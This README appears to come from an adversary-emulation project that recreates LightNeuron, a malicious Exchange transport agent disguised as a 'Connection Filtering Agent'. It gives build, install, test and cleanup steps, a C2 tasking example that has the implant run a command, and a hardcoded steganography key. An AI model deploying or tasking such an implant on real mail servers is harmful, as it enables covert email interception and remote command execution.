# LightNeuron

LightNeuron is broken up into the following components:
| Component | Description |
| --- | --- |
| Transport Agent | Microsoft transport agent |
| Companion DLL | Malicious companion code |
| PowerShell Install Script | Installs the transport agent |
| Configuration File | Configuration of companion DLL C2 communications |
| Rule File | Configuration of LightNeuron's email processing behavior |

## Build Instructions

### Transport Agent

Run the following to recompile the transport agent DLL from the `Microsoft.Exchange.Transport.Agent.ConnectionFiltering` directory:

```
dotnet build -c Release output .
```

> **NOTE:** if compiling in a different directory than the original project directory, the 
> `Microsoft.Exchange.Data.Common.dll` and `Microsoft.Exchange.Data.Transport.dll` must be located in
> the directory where the command is being executed. These binaries can be copied from an installed
> version of Exchange.

### Companion DLL

Run the following to compile the Companion dll for use by the transport agent.
File was originally compiled on Windows 10

1. Make sure CMake is installed on your machine
    - `choco install cmake --installargs '"ADD_CMAKE_TO_PATH=System"'`
    - You will need to restart the shell to use cmake.
    - If cmake was already installed but is not in your path, add it to your path manually (e.g. `C:\Program Files\CMake\bin`)
1. Make sure mingw64 is installed on your machine. In this particular example, `msys2` was installed and used to install mingw64.
    - `choco install msys2`
    - Add `C:\tools\msys64` to your PATH enviromment variable to run `msys2`. Reopen console windows to register the new env variable.
    - Run `msys2` and within the new prompt, run the following:
        - `pacman -Syu`
        - `pacman -S --needed base-devel mingw-w64-x86_64-toolchain`
1. Ensure the following paths are set in the SYSTEM environment PATH variable (note that these may differ in your environment depending on how you installed CMake and mingw64).
    - `C:\Program Files\CMake\bin` or equivalent CMake `bin` folder
    - `C:\tools\msys64\mingw64\bin` or equivalent Mingw-w64 `bin` folder
    - Paths  to folders containing `gcc` and `g++` compilers if not already included in the above Mingw-w64 path folder.
    - Reopen console windows to register the new env variables.
1. Install vcpkg onto your system
    - Download the repository to `C:\vcpkg`
    - `git clone https://github.com/Microsoft/vcpkg.git`
    - `.\vcpkg\bootstrap-vcpkg.bat`

```
cmake -DCMAKE_EXPORT_COMPILE_COMMANDS:BOOL=TRUE -DCMAKE_BUILD_TYPE:STRING=Release -DCMAKE_C_COMPILER:FILEPATH=gcc.exe -DCMAKE_CXX_COMPILER:FILEPATH=g++.exe -S . -B build -G "MinGW Makefiles"
 ```
 ```
 cmake --build build --config Release --target all -j 4 --
 ```

## Test Instructions

### Test Instructions for Transport Agent
Tests were run from a Windows machine using PowerShell and will interact with the Exchange server
provided as an argument to the script. The Windows host should be able to resolve the Exchange
server's hostname properly.

These tests will copy the transport agent DLL and TestIngestStruct DLL, install the transport
agent, test functionality by sending emails, checking DLL log files, and checking inboxes, then
uninstall the transport agent and remove all files.

> **NOTE:** This test script is dependent on `Microsoft.Exchange.WebServices.dll`. This binary
> can be copied from an installed version of Exchange and should be placed in the same directory
> where the test script is being executed from.

1. Ensure the transport agent is built using the above command and the DLL is located in the 
`TransportAgent\Microsoft.Exchange.Transport.Agent.ConnectionFiltering` directory
1. Ensure the Microsoft.Exchange.WebServices.dll is located within the 
`Microsoft.Exchange.Transport.Agent.ConnectionFiltering.Tests` directory. If not, this DLL can be
downloaded from the binaries available in an installed Exchange server.
1. Change directory into the `Microsoft.Exchange.Transport.Agent.ConnectionFiltering.Tests` directory:
```
cd Microsoft.Exchange.Transport.Agent.ConnectionFiltering.Tests
```
1. Run the PowerShell script testing transport agent functionality:
```
.\ConnectionFilteringAgentTests.ps1 -sender <sender username> -senderPassword <sender plaintext password> -receiver <receiver username> -receiverPassword <receiver plaintext password> -domain <domain name> -server <Exchange server hostname>
```

### Test Instructions for Companion DLL

Unit tests were run on a Windows machine using CMake. Running this will also build the script in the `CompanionDLL\util` directory.

1. Set up and run tests via Powershell from the Companion DLL Directory to check:
```
cmake -DCMAKE_EXPORT_COMPILE_COMMANDS:BOOL=TRUE -DCMAKE_BUILD_TYPE:STRING=Debug -DCMAKE_C_COMPILER:FILEPATH=gcc.exe -DCMAKE_CXX_COMPILER:FILEPATH=g++.exe -S . -B build -G "MinGW Makefiles"
cmake --build build --config Debug --target all -j 4 --
cd build
ctest
```

### Test Instructions for Full Implant Testing

1. Open an admin PowerShell in the LightNeuron directory
1. Run the following to install all components of LightNeuron:
    ```
    powershell .\setup.ps1
    ```
    This will copy over the rule file, configuration file, Companion DLL (from the CompanionDLL/data directory),
    and the transport agent `Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll` (from the TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering directory).
1. Once the setup script has finished executing, you may begin sending emails that will be collected by LightNeuron
as indicated by its rule file
1. To tear down the full implant testing, run the following from the same admin PowerShell
terminal from earlier (or open a new admin PowerShell) to delete all artifacts:
    ```
    .\teardown.ps1
    ```

## Usage Examples

### Transport Agent

1. Copy the Transport Agent DLL to the Exchange server at: C:\Program Files\Microsoft\Exchange Server\v15\TransportRoles\agents\Hygiene\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll.

1. For testing with the TestIngestStruct, copy the TestIngestStruct.dll to the same directory as the
Transport Agent DLL.

1. Copy msita.ps1 to the Exchange Server and execute from an Admin PowerShell.

1. Sending emails between users should now be logged in the LightNeuron log file. The
TestIngestStruct DLL will also log email data of the most recent email received at the file:
C:\\Windows\\serviceprofiles\\networkservice\\appdata\\Roaming\\Microsoft\\Windows\\TestIngestDebug

## Analyzing a Test Image

Under `CompanionDLL\util` an executable is included to use the steganography portion of the Companion DLL without needing to use the rest of the implant. This is useful for verifying that returned images being sent to the implant contain the expected result.

Note: The current implementation will encrypt the resulting command output before embedding it in the output file, so if you open the image in a hex editor it will still look like random data.

### Using the Executable

1. Building the Executable

    1. Follow the same steps as building the unit tests. 

    1. When running the build command, it will automatically rebuild the `analyze_image.exe` binary.

1. Generate the image using the C2 server

    1. Run the C2 server like normal, then call the lightneuron handler with whatever command you want to test.
    ```
    ./evalsC2client --set-task <GUID/EMAIL> '<cmdID> | <command to execute>'
    ./evalsC2client --set-task temp@mail.local '5 | whoami'
    ```

    1. Even without being able to send the image, a `snake_modified.jpg` image will be generated, this is the image to use for testing.

    1. Note: Encryption must be enabled for this image to work with the implant. To enable encryption on the C2 server, set the `encryption` flag to `true` in the implant config.

    1. Note: Take note of the signature key that is used when generating the image, it will be needed to run this utility script. The key is hardcoded into the C2 server handler, it's currently set to: `pwndsnek`

1. Run the Executable

    1. Copy the `snake_modified.jpg` image to the same folder as the executable.

    1. Run the executable with the path to the image and signature key.

        1. Using default filename and key from C2 server:
        ```
        .\analyze_image.exe snake_modified.jpg pwndsnek
        ```
    
    1. If successful, the resulting image will be written to: `output.jpg`

    1. This image can now be dropped in the `pickup` folder of the C2 server to be analyzed and see the result.

## Cleanup Instructions

### Removing installed transport agents

#### Manually cleaning files from the Exchange Server

Open and run Exchange Management Shell as Administrator. Execute the following:

```
Disable-TransportAgent -Identity "Connection Filtering Agent" -Confirm:$false
Uninstall-TransportAgent -Identity "Connection Filtering Agent" -Confirm:$false

Restart-Service MSExchangeTransport
```

Remove the LightNeuron log file:

```
Remove-Item C:\\Windows\\serviceprofiles\\networkservice\\appdata\\Roaming\\Microsoft\\Windows\\5365f8a8-27e0-4727-914a-2ab6b734771a
```

If using the TestIngestStruct, remove the debug file:

```
Remove-Item C:\\Windows\\serviceprofiles\\networkservice\\appdata\\Roaming\\Microsoft\\Windows\\TestIngestDebug
```

#### Automated cleanup

Please see the [LightNeuron](../../cleanup/README.md) in the `Resources/cleanup` directory


## Misc

### msiex.ps1
Install Microsoft Exchange Transport Agent

CTI indicates PowerShell installer script file name was msinp.ps1. This has
been tweaked to msiex.ps1 instead.


### CTI Evidence
https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf

### References
https://docs.microsoft.com/en-us/exchange/client-developer/transport-agents/how-to-create-an-smtpreceiveagent-transport-agent-for-exchange-2013

https://docs.microsoft.com/en-us/exchange/client-developer/transport-agents/how-to-create-a-routingagent-transport-agent-for-exchange-2013

https://stackoverflow.com/a/13935718

https://github.com/ReneNyffenegger/cpp-base64

https://github.com/zeux/pugixml